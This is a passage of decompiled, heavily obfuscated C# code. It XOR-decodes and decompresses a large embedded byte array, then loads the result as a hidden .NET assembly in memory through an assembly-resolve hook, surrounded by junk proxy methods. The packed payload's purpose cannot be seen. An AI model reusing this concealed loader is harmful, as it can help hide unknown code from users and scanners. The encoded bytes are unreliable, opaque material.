						135, 30, 177, 124, 248, 197, 145, 227, 50, 198,
						122, 47, 120, 8, 240, 49, 99, 147, 175, 2,
						16, 241, 123, 124, 35, 145, 226, 64, 18, 166,
						212, 12, 80, 187, 250, 246, 197, 248, 173, 125,
						101, 187, 236, 198, 235, 204, 113, 27, 226, 211,
						239, 56, 8, 232, 76, 81, 221, 168, 168, 16,
						225, 44, 194, 63, 81, 138, 70, 177, 39, 21,
						160, 213, 162, 80, 135, 28, 210, 221, 101, 66,
						224, 27, 213, 9, 249, 88, 176, 183, 105, 106,
						191, 99, 92, 112, 147, 5, 110, 176, 238, 200,
						213, 57, 187, 3, 201, 154, 119, 60, 9, 234,
						197, 23, 52, 57, 29, 174, 194, 175, 105, 219,
						215, 68, 18, 16, 231, 60, 105, 7, 67, 181,
						10, 222, 72, 227, 237, 221, 18, 70, 4, 194,
						73, 240, 88, 8, 95, 249, 169, 178, 5, 101,
						156, 200, 254, 85, 140, 162, 20, 82, 4, 82,
						211, 36, 66, 4, 83, 120, 117, 217, 169, 146,
						2, 154, 150, 82, 137, 181, 194, 159, 91, 112,
						125, 61, 137, 235, 96, 125, 56, 94, 219, 227,
						223, 114, 117, 158, 26, 217, 213, 36, 154, 158,
						202, 38, 141, 90, 109, 225, 118, 168, 130, 119,
						18, 102, 191, 94, 155, 243, 212, 249, 95, 82,
						91, 150, 183, 207, 246, 20, 18, 107, 143, 90,
						41, 120, 205, 248, 41, 229, 175, 120, 12, 54,
						76, 154, 245, 62, 59, 164, 32, 10, 254, 131,
						50, 10, 114, 247, 77, 22, 214, 195, 52, 8,
						79, 108, 227, 96, 254, 68, 82, 147, 54, 90,
						215, 214, 2, 169, 124, 173, 86, 151, 227, 52,
						157, 208, 116, 8, 234, 218, 149, 95, 124, 10,
						239, 193, 101, 23, 112, 14, 226, 199, 137, 71,
						60, 86, 167, 138, 47, 227, 189, 9, 140, 74,
						120, 125, 219, 145, 228, 242, 155, 137, 162, 98,
						93, 187, 234, 55, 1, 191, 176, 216, 176, 114,
						99, 125, 128, 102, 5, 78, 56, 246, 93, 77,
						208, 152, 120, 200, 181, 208, 60, 250, 224, 55,
						5, 10, 106, 120, 219, 162, 29, 42, 215, 211,
						24, 48, 120, 63, 85, 79, 4, 76, 63, 128,
						186, 55, 229, 93, 69, 101, 230, 145, 144, 15,
						86, 220, 97, 168, 71, 8, 114, 241, 151, 205,
						97, 74, 173, 71, 55, 230, 249, 171, 15, 192,
						20, 165, 178, 93, 71, 135, 9, 99, 25, 115,
						251, 124, 137, 231, 6, 15, 177, 155, 174, 29,
						144, 55, 87, 128, 236, 95, 89, 170, 249, 77,
						229, 104, 107, 8, 129, 124, 83, 100, 197, 127,
						61, 195, 1, 249, 59, 227, 181, 215, 159, 117,
						131, 105, 79, 58, 76, 26, 132, 213, 250, 116,
						113, 165, 103, 169, 31, 145, 178, 234, 72, 32,
						2, 77, 6, 140, 155, 126, 185, 110, 17, 70,
						93, 56, 182, 199, 174, 128, 70, 5, 230, 19,
						41, 26, 251, 117, 58, 137, 6, 10, 126, 129,
						160, 230, 238, 77, 38, 243, 200, 118, 163, 32,
						231, 32, 97, 48, 157, 139, 201, 196, 121, 61,
						71, 59, 146, 115, 85, 129, 216, 63, 60, 237,
						43, 231, 201, 233, 33, 0, 233, 209, 169, 107,
						223, 144, 17, 204, 104, 58, 202, 195, 10, 3,
						91, 213, 39, 68, 251, 75, 16, 161, 227, 29,
						169, 67, 11, 45, 13, 158, 189, 224, 126, 241,
						204, 75, 45, 236, 132, 51, 57, 250, 152, 46,
						213, 108, 202, 82, 184, 125, 250, 34, 152, 100,
						41, 250, 43, 107, 189, 166, 201, 17, 214, 46,
						124, 164, 146, 183, 227, 245, 82, 172, 209, 137,
						66, 232, 230, 36, 208, 157, 9, 60, 254, 109,
						35, 75, 121, 92, 107, 181, 0, 162, 117, 236,
						3, 50, 56, 31, 242, 143, 227, 182, 64, 96,
						197, 120, 132, 33, 76, 157, 155, 255, 8, 143,
						90, 241, 187, 248, 177, 165, 213, 204, 73, 123,
						248, 209, 227, 90, 66, 244, 85, 47, 155, 49,
						142, 95, 91, 156, 6, 155, 127, 176, 242, 46,
						208, 188, 0, 188, 184, 169, 126, 72, 150, 27,
						234, 220, 57, 59, 77, 243, 223, 228, 113, 146,
						38, 125, 235, 113, 148, 136, 13, 37, 212, 232,
						123, 219, 164, 214, 54, 74, 18, 25, 166, 99,
						1, 15, 5, 40, 5, 170, 207, 184, 174, 19,
						140, 68, 70, 119, 76, 18, 118, 251, 169, 114,
						251, 32, 198, 12, 218, 232, 26, 88, 104, 102,
						20, 239, 112, 158, 50, 45, 44, 26, 222, 209,
						52, 226, 54, 96, 144, 23, 150, 146, 65, 174,
						227, 119, 37, 109, 217, 107, 214, 44, 92, 71,
						123, 45, 131, 18, 112, 91, 3, 239, 165, 116,
						204, 102, 148, 51, 39, 223, 14, 214, 35, 31,
						241, 64, 48, 183, 242, 86, 87, 67, 47, 154,
						54, 95, 63, 37, 231, 164, 182, 13, 174, 161,
						57, 152, 38, 237, 191, 240, 96, 22, 227, 135,
						64, 57, 151, 134, 63, 205, 187, 113, 142, 0,
						225, 51, 209, 217, 139, 4, 119, 59, 71, 126,
						39, 149, 75, 21, 165, 151, 247, 81, 87, 162,
						76, 98, 181, 105, 11, 137, 142, 85, 134, 68,
						249, 228, 229, 103, 0, 145, 189, 122, 141, 41,
						234, 139, 149, 111, 40, 220, 220, 233, 178, 104,
						166, 55, 163, 175, 123, 203, 106, 200, 2, 129,
						123, 136, 172, 251, 194, 12, 140, 173, 192, 135,
						5, 162, 64, 83, 116, 186, 111, 72, 74, 211,
						82, 224, 89, 144, 207, 73, 26, 123, 136, 214,
						197, 46, 244, 195, 166, 186, 69, 42, 43, 191,
						51, 204, 162, 252, 93, 223, 68, 187, 28, 173,
						155, 252, 245, 157, 220, 7, 227, 15, 242, 100,
						83, 227, 80, 158, 149, 201, 112, 51, 120, 224,
						192, 1, 163, 6, 196, 222, 230, 185, 148, 21,
						15, 12, 90, 237, 34, 180, 39, 246, 62, 200,
						19, 204, 189, 132, 9, 220, 220, 211, 26, 70,
						36, 102, 106, 57, 142, 169, 169, 182, 195, 175,
						161, 189, 157, 206, 160, 81, 129, 213, 217, 211,
						216, 143, 67, 130, 148, 127, 0, 100, 138, 201,
						139, 242, 241, 193, 223, 95, 88, 100, 9, 197,
						13, 21, 163, 5, 203, 42, 249, 190, 140, 184,
						162, 28, 203, 151, 96, 182, 160, 89, 5, 76,
						203, 83, 153, 75, 120, 171, 95, 232, 9, 170,
						204, 23, 221, 53, 46, 55, 246, 58, 155, 143,
						148, 114, 230, 64, 247, 111, 188, 204, 91, 191,
						220, 66, 12, 13, 208, 126, 166, 198, 177, 45,
						86, 163, 211, 100, 115, 201, 167, 32, 57, 50,
						213, 133, 180, 161, 254, 79, 137, 236, 83, 148,
						186, 208, 238, 88, 50, 235, 100, 9, 100, 224,
						211, 240, 189, 110, 74, 29, 96, 68, 105, 27,
						34, 9, 208, 230, 244, 242, 221, 161, 200, 121,
						150, 226, 204, 10, 121, 86, 223, 231, 254, 221,
						39, 235, 162, 102, 169, 96, 175, 15, 250, 83,
						129, 69, 177, 249, 218, 79, 209, 20, 52, 35,
						252, 159, 100, 36, 207, 118, 95, 76, 173, 127,
						58, 47, 225, 175, 106, 52, 230, 184, 174, 109,
						240, 105, 135, 212, 225, 167, 191, 42, 8, 227,
						182, 151, 246, 123, 43, 35, 148, 60, 88, 99,
						60, 5, 246, 94, 173, 20, 33, 198, 143, 132,
						238, 48, 122, 197, 26, 171, 55, 95, 193, 76,
						120, 146, 240, 71, 17, 7, 236, 85, 93, 138,
						23, 154, 206, 185, 45, 162, 221, 196, 174, 145,
						112, 64, 161, 15, 106, 203, 166, 126, 53, 35,
						157, 74, 239, 149, 113, 6, 29, 157, 182, 26,
						148, 80, 92, 31, 167, 139, 241, 17, 180, 157,
						29, 193, 215, 207, 148, 89, 163, 160, 101, 77,
						209, 172, 201, 95, 160, 240, 120, 19, 187, 13,
						85, 88, 164, 192, 174, 19, 120, 204, 30, 122,
						252, 20, 151, 194, 98, 253, 241, 171, 15, 211,
						7, 230, 8, 194, 155, 26, 109, 65, 128, 50,
						144, 252, 244, 55, 243, 26, 192, 181, 201, 36,
						153, 46, 125, 214, 218, 32, 79, 87, 14, 68,
						13, 122, 209, 18, 216, 45, 84, 9, 127, 29,
						49, 77, 2, 60, 19, 220, 47, 177, 32, 177,
						106, 250, 183, 75, 137, 110, 64, 132, 19, 186,
						219, 196, 215, 108, 92, 127, 46, 38, 73, 159,
						103, 150, 171, 130, 25, 177, 9, 98, 26, 93,
						115, 137, 136, 96, 109, 11, 22, 113, 129, 216,
						96, 194, 93, 1, 93, 103, 203, 145, 85, 14,
						52, 99, 63, 147, 63, 82, 248, 175, 87, 45,
						230, 250, 56, 238, 144, 74, 28, 153, 50, 203,
						114, 57, 104, 50, 69, 183, 219, 179, 251, 3,
						102, 78, 195, 126, 210, 147, 71, 103, 54, 181,
						210, 157, 10, 87, 18, 169, 63, 201, 19, 162,
						157, 187, 16, 135, 40, 199, 29, 57, 182, 116,
						83, 122, 6, 196, 62, 190, 75, 171, 176, 137,
						37, 120, 146, 186, 76, 158, 129, 7, 221, 56,
						76, 238, 164, 195, 138, 129, 235, 15, 96, 120,
						34, 16, 5, 74, 218, 190, 156, 236, 203, 31,
						152, 26, 146, 250, 38, 58, 158, 122, 0, 212,
						57, 86, 214, 91, 191, 181, 92, 42, 52, 222,
						86, 197, 130, 97, 106, 167, 65, 118, 50, 140,
						243, 116, 153, 105, 92, 3, 75, 181, 111, 125,
						169, 156, 183, 11, 62, 90, 6, 249, 49, 175,
						61, 126, 148, 156, 36, 13, 18, 234, 94, 206,
						67, 157, 67, 144, 93, 144, 236, 29, 100, 141,
						134, 119, 141, 98, 190, 129, 55, 109, 155, 18,
						246, 89, 144, 37, 41, 121, 10, 230, 235, 80,
						60, 160, 74, 31, 125, 180, 56, 164, 214, 142,
						53, 203, 21, 138, 217, 128, 212, 134, 130, 186,
						47, 239, 208, 169, 208, 125, 74, 148, 242, 73,
						175, 42, 129, 166, 92, 218, 112, 138, 160, 95,
						58, 93, 210, 169, 25, 137, 213, 12, 203, 237,
						150, 204, 94, 54, 233, 16, 138, 16, 228, 106,
						154, 92, 141, 96, 140, 105, 93, 33, 139, 138,
						84, 57, 130, 214, 56, 178, 99, 253, 107, 109,
						190, 112, 114, 213, 131, 203, 160, 55, 29, 41,
						37, 19, 57, 131, 56, 132, 73, 42, 2, 202,
						52, 168, 213, 252, 28, 82, 143, 30, 15, 170,
						114, 30, 182, 27, 17, 202, 31, 165, 18, 37,
						40, 187, 55, 105, 204, 162, 238, 111, 62, 59,
						24, 50, 37, 24, 254, 237, 166, 55, 54, 34,
						12, 191, 75, 92, 85, 243, 164, 159, 77, 99,
						191, 98, 179, 207, 115, 100, 227, 46, 237, 168,
						64, 196, 4, 188, 175, 254, 247, 113, 77, 92,
						233, 28, 253, 50, 243, 178, 169, 148, 228, 245,
						232, 149, 17, 130, 46, 239, 238, 147, 175, 84,
						22, 166, 92, 175, 19, 39, 87, 127, 253, 230,
						146, 83, 187, 185, 128, 233, 159, 215, 19, 61,
						69, 145, 231, 100, 241, 250, 174, 128, 166, 106,
						253, 236, 31, 118, 32, 141, 137, 32, 241, 54,
						253, 89, 245, 85, 145, 40, 3, 254, 40, 115,
						53, 150, 225, 161, 14, 193, 137, 79, 2, 160,
						15, 229, 253, 78, 76, 153, 77, 105, 229, 46,
						252, 153, 66, 154, 82, 177, 246, 90, 16, 198,
						66, 78, 102, 118, 22, 255, 150, 243, 167, 134,
						206, 188, 167, 41, 21, 144, 248, 65, 198, 45,
						188, 90, 112, 184, 5, 85, 5, 64, 172, 33,
						252, 58, 176, 207, 206, 36, 143, 45, 253, 98,
						0, 150, 233, 233, 213, 250, 95, 211, 225, 120,
						63, 52, 176, 198, 3, 38, 179, 7, 233, 56,
						99, 254, 214, 12, 135, 155, 8, 147, 188, 117,
						205, 240, 231, 12, 22, 4, 148, 95, 47, 4,
						0, 74, 166, 150, 15, 228, 51, 216, 155, 211,
						171, 39, 250, 36, 253, 252, 94, 114, 109, 219,
						62, 164, 31, 70, 209, 60, 198, 82, 224, 14,
						179, 34, 180, 198, 143, 9, 111, 28, 37, 97,
						226, 93, 149, 246, 254, 30, 248, 17, 252, 237,
						243, 73, 61, 77, 53, 113, 122, 130, 160, 153,
						166, 118, 63, 226, 106, 188, 180, 238, 133, 126,
						10, 224, 89, 161, 146, 188, 237, 223, 61, 204,
						79, 15, 87, 76, 98, 222, 4, 198, 229, 177,
						25, 54, 160, 111, 193, 236, 54, 98, 207, 217,
						62, 175, 198, 135, 152, 3, 94, 63, 154, 236,
						39, 189, 131, 245, 1, 143, 178, 110, 148, 127,
						242, 245, 72, 3, 90, 109, 77, 237, 50, 124,
						35, 41, 18, 173, 123, 160, 157, 36, 199, 115,
						32, 26, 137, 116, 148, 50, 196, 184, 217, 50,
						63, 166, 9, 187, 201, 78, 119, 143, 90, 172,
						215, 84, 127, 2, 93, 206, 150, 164, 128, 130,
						130, 60, 55, 113, 200, 157, 232, 248, 26, 204,
						183, 23, 226, 71, 139, 158, 50, 75, 234, 254,
						22, 202, 232, 95, 175, 15, 75, 205, 37, 21,
						117, 71, 66, 186, 73, 108, 79, 42, 204, 61,
						88, 232, 135, 36, 45, 248, 105, 198, 40, 194,
						56, 20, 149, 249, 217, 218, 193, 181, 213, 167,
						4, 10, 244, 166, 151, 236, 202, 29, 250, 242,
						128, 49, 205, 16, 20, 216, 64, 147, 124, 111,
						231, 233, 65, 229, 129, 27, 237, 195, 101, 240,
						218, 123, 49, 10, 20, 157, 46, 96, 139, 207,
						126, 6, 162, 55, 84, 70, 234, 197, 86, 165,
						211, 27, 212, 80, 184, 174, 30, 122, 14, 221,
						97, 10, 102, 192, 96, 214, 109, 208, 171, 225,
						52, 227, 24, 59, 154, 28, 10, 242, 183, 107,
						149, 173, 18, 97, 193, 31, 207, 101, 253, 22,
						162, 39, 237, 132, 117, 79, 125, 8, 250, 152,
						27, 231, 64, 220, 109, 173, 148, 223, 176, 84,
						4, 55, 253, 208, 138, 210, 120, 204, 142, 206,
						67, 34, 192, 38, 218, 12, 229, 24, 163, 52,
						138, 114, 190, 109, 157, 5, 83, 94, 250, 93,
						102, 214, 188, 244, 79, 21, 152, 7, 24, 35,
						255, 45, 229, 248, 119, 100, 135, 190, 80, 180,
						248, 87, 173, 234, 110, 58, 159, 144, 220, 53,
						115, 210, 255, 217, 167, 96, 20, 97, 239, 238,
						168, 126, 188, 5, 42, 109, 190, 6, 194, 195,
						248, 226, 172, 232, 85, 227, 218, 114, 108, 217,
						38, 190, 137, 193, 25, 223, 47, 58, 240, 253,
						169, 14, 164, 73, 203, 157, 75, 232, 31, 247,
						44, 223, 255, 57, 170, 16, 209, 218, 1, 73,
						210, 4, 31, 33, 234, 96, 61, 59, 117, 83,
						12, 127, 155, 186, 12, 141, 31, 123, 233, 235,
						62, 12, 37, 32, 199, 207, 75, 213, 66, 84,
						85, 176, 20, 25, 211, 146, 212, 36, 176, 168,
						18, 216, 194, 245, 197, 47, 19, 241, 112, 189,
						11, 109, 223, 207, 1, 186, 201, 46, 9, 181,
						114, 24, 57, 2, 198, 172, 122, 255, 154, 157,
						30, 88, 252, 227, 74, 96, 72, 255, 71, 59,
						141, 111, 23, 167, 161, 147, 94, 134, 239, 25,
						218, 83, 203, 80, 212, 129, 153, 102, 132, 245,
						237, 213, 218, 79, 130, 191, 119, 178, 110, 167,
						114, 70, 140, 225, 214, 45, 18, 221, 2, 147,
						52, 250, 187, 189, 229, 98, 232, 80, 167, 121,
						121, 4, 21, 182, 4, 35, 216, 225, 107, 203,
						85, 93, 51, 112, 71, 9, 45, 32, 92, 143,
						161, 237, 181, 134, 185, 177, 123, 159, 103, 52,
						146, 67, 168, 52, 193, 8, 241, 182, 91, 132,
						138, 138, 254, 173, 81, 78, 219, 246, 195, 203,
						45, 222, 255, 133, 200, 180, 51, 68, 123, 55,
						239, 81, 148, 54, 29, 16, 145, 239, 153, 61,
						186, 168, 38, 251, 248, 39, 83, 127, 135, 214,
						225, 171, 121, 105, 236, 50, 24, 71, 109, 45,
						77, 25, 92, 38, 23, 152, 227, 195, 173, 82,
						192, 47, 216, 121, 51, 183, 217, 221, 162, 94,
						166, 193, 88, 231, 222, 197, 176, 222, 90, 112,
						92, 153, 5, 50, 31, 197, 56, 229, 128, 166,
						141, 67, 68, 115, 223, 149, 24, 166, 113, 121,
						76, 251, 108, 193, 123, 246, 39, 206, 100, 23,
						94, 187, 182, 133, 223, 115, 63, 249, 147, 174,
						234, 112, 44, 61, 80, 44, 123, 249, 199, 92,
						218, 69, 36, 220, 114, 250, 213, 196, 133, 191,
						222, 178, 151, 2, 194, 222, 62, 5, 134, 243,
						248, 81, 206, 114, 99, 92, 102, 63, 0, 19,
						148, 91, 98, 155, 189, 206, 95, 4, 42, 55,
						19, 44, 194, 255, 22, 178, 6, 106, 163, 45,
						73, 80, 38, 162, 246, 82, 221, 8, 2, 105,
						16, 61, 169, 154, 148, 148, 139, 48, 249, 173,
						131, 179, 46, 54, 236, 166, 64, 173, 57, 40,
						27, 182, 133, 216, 139, 82, 74, 193, 195, 108,
						179, 219, 242, 102, 38, 220, 159, 224, 221, 148,
						81, 50, 157, 47, 223, 61, 103, 170, 126, 199,
						211, 84, 24, 85, 231, 195, 9, 91, 48, 222,
						169, 225, 118, 15, 88, 249, 111, 209, 101, 4,
						240, 152, 97, 118, 239, 241, 202, 115, 21, 146,
						84, 181, 211, 68, 185, 172, 130, 81, 227, 15,
						153, 77, 243, 50, 138, 241, 254, 221, 247, 231,
						200, 249, 166, 160, 212, 34, 141, 84, 120, 249,
						36, 223, 39, 41, 60, 206, 27, 99, 78, 160,
						230, 247, 38, 41, 85, 46, 159, 16, 24, 13,
						203, 206, 12, 44, 7, 159, 183, 33, 203, 43,
						207, 183, 119, 113, 34, 24, 98, 161, 207, 14,
						30, 135, 244, 50, 93, 19, 67, 56, 74, 237,
						88, 77, 15, 99, 51, 60, 39, 0, 114, 179,
						204, 122, 195, 42, 138, 214, 111, 164, 154, 155,
						108, 111, 206, 169, 168, 235, 76, 175, 196, 236,
						2, 15, 100, 227, 102, 223, 247, 59, 149, 154,
						81, 188, 225, 206, 64, 213, 217, 44, 84, 83,
						72, 15, 84, 85, 130, 76, 170, 70, 28, 78,
						87, 125, 66, 233, 70, 121, 7, 240, 44, 25,
						219, 0, 131, 161, 156, 175, 242, 117, 121, 39,
						44, 209, 134, 151, 50, 52, 188, 183, 41, 243,
						95, 129, 115, 34, 0, 196, 72, 12, 75, 143,
						129, 246, 158, 84, 182, 217, 152, 107, 107, 34,
						252, 145, 30, 44, 82, 244, 162, 156, 28, 0,
						172, 165, 245, 105, 179, 82, 66, 67, 226, 177,
						175, 234, 240, 251, 104, 64, 123, 152, 7, 111,
						153, 175, 42, 159, 18, 110, 243, 248, 183, 85,
						227, 238, 101, 234, 80, 47, 100, 16, 228, 255,
						171, 181, 8, 55, 166, 60, 8, 146, 50, 167,
						212, 7, 19, 43, 86, 49, 4, 93, 234, 139,
						206, 208, 205, 138, 66, 233, 70, 198, 235, 159,
						216, 35, 97, 39, 4, 17, 161, 34, 94, 161,
						230, 117, 28, 8, 18, 84, 196, 26, 35, 115,
						230, 132, 174, 125, 120, 227, 28, 247, 174, 166,
						175, 165, 49, 26, 35, 161, 166, 207, 153, 158,
						124
					};
					for (int num = int_1 - 1; num >= 0; num--)
					{
						array[num] ^= (byte)((num + int_1 - int_0) & 0xFF);
					}
					Stream stream = new MemoryStream();
					using (Stream gparam_5 = new DeflateStream(new MemoryStream(array), CompressionMode.Decompress, leaveOpen: true))
					{
						byte[] array2 = new byte[1024];
						int int_2;
						while ((int_2 = Class7.smethod_8(gparam_5, array2, 0, array2.Length, 713, 688)) > 0)
						{
							Class6.smethod_4(stream, array2, 0, int_2, 902, 'Ϛ');
						}
					}
					assembly = Class9.smethod_6(smethod_7((MemoryStream)stream, 750, '\u02d3'), null, (SecurityContextSource)1, 815, 835);
					Class3.smethod_12(gparam_4, gparam_3, (object)assembly, 'Õ', '\u00a0');
					string[] array3 = (string[])(ICloneable)Class3.smethod_13(assembly, (short)662, 665);
					foreach (string text in array3)
					{
						dictionary[text] = text;
					}
				}
				else
				{
					assembly = (Assembly)Class10.Class11.smethod_9(gparam_4, gparam_3, 'Ĥ', 290);
				}
				if (dictionary.ContainsKey(Class12.Class13.smethod_5(gparam_2, '\u02ed', 654)))
				{
					return assembly;
				}
			}
			return null;
		}

		[SecuritySafeCritical]
		internal static void smethod_2()
		{
			if (bool_0)
			{
				return;
			}
			Type gparam_;
			Class12.Class13.smethod_0((object)(gparam_ = (Type)(IReflect)typeof(Class5)), (short)211, (short)148);
			try
			{
				if (!bool_0)
				{
					bool_0 = true;
					Class10.Class11.smethod_10<ResolveEventHandler, AppDomain>(Class10.Class11.smethod_8(592, 557), smethod_0, '\u0099', 'ø');
				}
			}
			finally
			{
				Class12.Class13.smethod_0((object)gparam_, (short)440, (short)510);
			}
		}

		[SecuritySafeCritical]
		internal static object smethod_3<T>(T gparam_0, int int_0, int int_1)
		{
			int num = 0;
			object result = (((int_0 ^ int_1) - 82) ^ 0) switch
			{
				0 => Class10.Class11.smethod_11((object)gparam_0, 364, 263), 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_4(short short_0, char char_0)
		{
			int num = 0;
			switch (((short_0 ^ char_0) - 104) ^ 0)
			{
			case 0:
				Class10.smethod_0(193, 244);
				break;
			case 1:
				Class10.smethod_0(502, 448);
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static SpecialDirectoriesProxy smethod_5<T>(T gparam_0, char char_0, int int_0) where T : FileSystemProxy
		{
			int num = 0;
			SpecialDirectoriesProxy result = (SpecialDirectoriesProxy)((((int_0 ^ char_0) - 98) ^ 0) switch
			{
				0 => Class10.smethod_4<FileSystemProxy>((FileSystemProxy)(object)gparam_0, 483, 396), 
				_ => null, 
			});
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static string smethod_6<T, U>(U gparam_0, T gparam_1, short short_0, int int_0) where T : string where U : string
		{
			int num = 0;
			string result = (((short_0 ^ int_0) - 39) ^ 0) switch
			{
				0 => Class12.Class16.smethod_4((string)gparam_0, (string)gparam_1, (short)533, (short)544), 
				1 => Class12.Class16.smethod_4((string)gparam_0, (string)gparam_1, (short)962, (short)1015), 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static byte[] smethod_7<T>(T gparam_0, short short_0, char char_0) where T : MemoryStream
		{
			int num = 0;
			byte[] result = (((char_0 ^ short_0) - 61) ^ 0) switch
			{
				0 => (byte[])(Array)Class10.smethod_5((MemoryStream)gparam_0, (short)571, 'ɒ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_8<T, U>(T gparam_0, U gparam_1, char char_0, char char_1) where T : XElement where U : string
		{
			int num = 0;
			switch (((char_0 ^ char_1) - 33) ^ 0)
			{
			case 0:
				Class12.Class16.smethod_5<string, XElement>((XElement)(object)gparam_0, (string)gparam_1, (short)644, (short)736);
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static XAttribute smethod_9<T>(T gparam_0, int int_0, short short_0) where T : XElement
		{
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Expected O, but got Unknown
			int num = 0;
			XAttribute result;
			do
			{
				result = (XAttribute)((((int_0 ^ short_0) - 2) ^ num) switch
				{
					0 => (object)(XObject)Class12.Class16.smethod_6<XElement>((XElement)(object)gparam_0, 659, (short)726), 
					_ => null, 
				});
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static XAttribute smethod_10<T>(T gparam_0, short short_0, char char_0) where T : XAttribute
		{
			int num = 0;
			XAttribute result;
			int num2;
			do
			{
				result = (XAttribute)((((char_0 ^ short_0) - 46) ^ num) switch
				{
					0 => (IXmlLineInfo)Class10.smethod_6<XAttribute>((XAttribute)(object)gparam_0, '\a', 'S'), 
					_ => null, 
				});
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static bool smethod_11<T>(T gparam_0, short short_0, int int_0) where T : XAttribute
		{
			int num = 0;
			bool result;
			do
			{
				result = (((int_0 ^ short_0) - 33) ^ num) switch
				{
					0 => Class12.smethod_4<XAttribute>((XAttribute)(object)gparam_0, 275, (short)287), 
					_ => true, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_12<T>(T gparam_0, int int_0, int int_1) where T : XAttribute
		{
			int num = 0;
			switch (((int_0 ^ int_1) - 83) ^ 0)
			{
			case 0:
				Class12.Class13.smethod_6<XAttribute>((XAttribute)(object)gparam_0, 'Ľ', (short)329);
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static void smethod_13<T, U, V>(T gparam_0, U gparam_1, V gparam_2, int int_0, char char_0) where T : Hashtable
		{
			int num = 0;
			do
			{
				switch (((char_0 ^ int_0) - 7) ^ num)
				{
				case 0:
					Class10.Class11.smethod_12((Hashtable)gparam_0, (object)gparam_1, (object)gparam_2, 516, 'ɱ');
					break;
				}
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
		}

		[SecuritySafeCritical]
		internal static void smethod_14<T>(T gparam_0, bool bool_1, int int_0, short short_0) where T : WindowsFormsApplicationBase
		{
			int num = 0;
			switch (((short_0 ^ int_0) - 22) ^ 0)
			{
			case 0:
				Class12.smethod_5<WindowsFormsApplicationBase>((WindowsFormsApplicationBase)(object)gparam_0, bool_1, '\u0345', (short)874);
				break;
			}
			num++;
		}
	}

	internal sealed class Class7
	{
		[SecuritySafeCritical]
		internal static void smethod_0<T>(T gparam_0, int int_0, int int_1) where T : ApplicationSettingsBase
		{
			int num = 0;
			switch (((int_0 ^ int_1) - 80) ^ 0)
			{
			case 0:
				Class12.Class16.smethod_7<ApplicationSettingsBase>((ApplicationSettingsBase)(object)gparam_0, '\u02c2', 'ʞ');
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static bool smethod_1<T, U>(U gparam_0, T gparam_1, int int_0, int int_1)
		{
			int num = 0;
			bool result = (((int_0 ^ int_1) - 74) ^ 0) switch
			{
				0 => Class10.smethod_7((object)gparam_0, (object)gparam_1, (short)579, 'ȹ'), 
				_ => true, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_2<T>(T gparam_0, SizeF sizeF_0, char char_0, char char_1) where T : ContainerControl
		{
			int num = 0;
			switch (((char_1 ^ char_0) - 30) ^ 0)
			{
			case 0:
				Class10.Class11.smethod_13<ContainerControl>((ContainerControl)(object)gparam_0, sizeF_0, 'ȧ', (short)619);
				break;
			}
			num++;
		}

		[SecuritySafeCritical]
		internal static FileSystemProxy smethod_3<T>(T gparam_0, int int_0, int int_1) where T : ServerComputer
		{
			int num = 0;
			FileSystemProxy result = (FileSystemProxy)((((int_1 ^ int_0) - 94) ^ 0) switch
			{
				0 => Class10.Class11.smethod_14<ServerComputer>((ServerComputer)(object)gparam_0, (short)935, 918), 
				_ => null, 
			});
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static string smethod_4<T>(T gparam_0, int int_0, short short_0) where T : SpecialDirectoriesProxy
		{
			int num = 0;
			string result;
			do
			{
				result = (((short_0 ^ int_0) - 8) ^ num) switch
				{
					0 => (string)(IComparable)Class10.Class11.smethod_15<SpecialDirectoriesProxy>((SpecialDirectoriesProxy)(object)gparam_0, 313, 'Ġ'), 
					_ => null, 
				};
				num++;
			}
			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static void smethod_5<T>(T gparam_0, byte[] byte_0, char char_0, short short_0) where T : string
		{
			int num = 0;
			do
			{
				switch (((short_0 ^ char_0) - 124) ^ num)
				{
				case 0:
					Class10.Class11.smethod_16((string)gparam_0, byte_0, 475, (short)467);
					break;
				}
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
		}

		[SecuritySafeCritical]
		internal static Assembly smethod_6<T>(T gparam_0, char char_0, char char_1) where T : ResolveEventArgs
		{
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Expected O, but got Unknown
			int num = 0;
			Assembly result;
			do
			{
				result = (((char_0 ^ char_1) - 13) ^ num) switch
				{
					0 => (Assembly)(IEvidenceFactory)Class10.Class11.smethod_17((ResolveEventArgs)gparam_0, 851, (short)827), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static object smethod_7<T, U>(T gparam_0, U gparam_1, short short_0, short short_1) where T : AppDomain where U : string
		{
			int num = 0;
			object result = (((short_0 ^ short_1) - 123) ^ 0) switch
			{
				0 => Class10.Class11.smethod_9((AppDomain)gparam_0, (string)gparam_1, '\u0013', (short)21), 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static int smethod_8<T>(T gparam_0, byte[] byte_0, int int_0, int int_1, int int_2, short short_0) where T : Stream
		{
			int num = 0;
			int result;
			do
			{
				result = (((int_2 ^ short_0) - 121) ^ num) switch
				{
					0 => Class10.Class11.smethod_18((Stream)gparam_0, byte_0, int_0, int_1, 113, '\t'), 
					_ => int_2, 
				};
				num++;
			}
